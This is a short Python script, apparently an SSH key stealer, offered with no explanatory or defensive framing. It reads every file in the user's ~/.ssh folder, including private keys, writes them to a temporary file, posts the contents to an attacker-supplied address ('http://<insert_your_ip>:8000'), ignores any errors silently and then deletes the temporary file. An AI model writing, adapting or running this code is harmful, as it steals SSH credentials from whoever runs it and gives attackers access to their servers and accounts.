import os

home_dir = os.path.expanduser("~")
ssh_folder_path = os.path.join(home_dir, ".ssh")
ssh_folder_exists = os.path.isdir(ssh_folder_path)


contents = []
if ssh_folder_exists:
	for filename in os.listdir(ssh_folder_path):
		filepath = os.path.join(ssh_folder_path, filename)
		if os.path.isfile(filepath):
			with open(filepath,'r') as filp:
				contents.append([filename, filp.read()])
else:
	print('Directory does not exist')

# print(contents)

with open('data.txt','w') as fh:
	fh.write(str(contents))
try:
	import urllib.request
	import urllib.parse

	webhook_url = "http://<insert_your_ip>:8000" 
	file_path = "data.txt"

	with open(file_path, 'rb') as f:
	    data = f.read()

	params = urllib.parse.urlencode({'file_data': data}).encode()  # Encode the data

	req = urllib.request.Request(webhook_url, data=params)
	response = urllib.request.urlopen(req) 
except Exception as e:
    # Do nothing when there is an error
    pass 

if os.path.exists('data.txt'):
	os.remove('data.txt')
